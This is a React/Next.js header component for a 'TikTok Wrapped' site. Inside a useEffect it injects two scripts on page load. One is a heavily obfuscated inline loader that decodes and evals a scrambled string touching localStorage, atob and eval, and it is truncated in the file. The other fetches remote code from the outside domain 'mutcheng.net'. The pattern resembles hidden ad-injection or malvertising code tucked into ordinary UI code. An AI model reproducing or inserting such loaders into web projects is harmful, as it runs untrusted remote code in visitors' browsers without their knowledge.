// src/components/Header.tsx
"use client";

import React, { useEffect } from 'react';
import Link from 'next/link';

const Header = () => {
  useEffect(() => {
    // 创建第一个脚本元素
    const script1 = document.createElement('script');
    script1.type = 'text/javascript';
    script1.dataset.cfasync = 'false';
    script1.innerHTML = `(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJtSsOzNezmDaartfeizzAtrnreamyuzcPordozmyidsoebzzpeatrasteSIyndtazenrazvtipgiartcoSrtzneenrcroudcezUeRmIazNUgianTty8BAsrtrnaeymzesleEttTeigmzedoIuytBztsneetmIenltEetrevgazlSzNAtrnreamyeBluEfeftearezrcclzetanreTmigmaeroFuttnzecmluecaorDIenttaeerrvcazltznMeevsEshacgteaCphsaindnzelllzABrrootacdeclaesStyCrheaunqnzerloztecnecloedSeyUrReIuCqozmrpeonneetnstizLTtynpeevEErervoormzeErvzernetnzeEtrsrioLrtznIemvaEgdedzaszetsnseimoenlSEteotraaegrec'.split("").reduce((v,g,L)=>L%2?v+g:g+v).split("z");(v=>{let g=[K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],K[8],K[9]],L=[K[10],K[11],K[12]],R=document,U,s,c=window,C={};try{try{U=window[K[13]][K[0]](K[14]),U[K[15]][K[16]]=K[17]}catch(a){s=(R[K[10]]?R[K[10]][K[18]]:R[K[12]]||R[K[19]])[K[20]](),s[K[21]]=K[22],U=s[K[2...(line too long; chars omitted)

    // 创建第二个脚本元素
    const script2 = document.createElement('script');
    script2.innerHTML = `(function(d,z,s,c){s.src='//'+d+'/400/'+z;s.onerror=s.onload=E;function E(){c&&c();c=null}try{(document.body||document.documentElement).appendChild(s)}catch(e){E()}})('mutcheng.net',8432805,document.createElement('script'),_tdrqytl)`;

    // 将脚本添加到文档中
    document.body.appendChild(script1);
    document.body.appendChild(script2);

    // 清理函数，组件卸载时移除脚本
    return () => {
      document.body.removeChild(script1);
      document.body.removeChild(script2);
    };
  }, []);

  return (
    <header className="bg-brown-800 text-cream-100 py-4">
      <nav className="container mx-auto px-4 flex justify-between items-center">
        <Link href="/" className="text-2xl font-bold">
          TikTok Wrapped
        </Link>
        <ul className="flex space-x-4">
          <li>
            <Link href="/" className="hover:text-brown-300">
              Home
            </Link>
          </li>
          <li>
            <Link href="/blogs" className="hover:text-brown-300">
              Blogs
            </Link>
          </li>
        </ul>
      </nav>
    </header>
  );
}

export default Header;
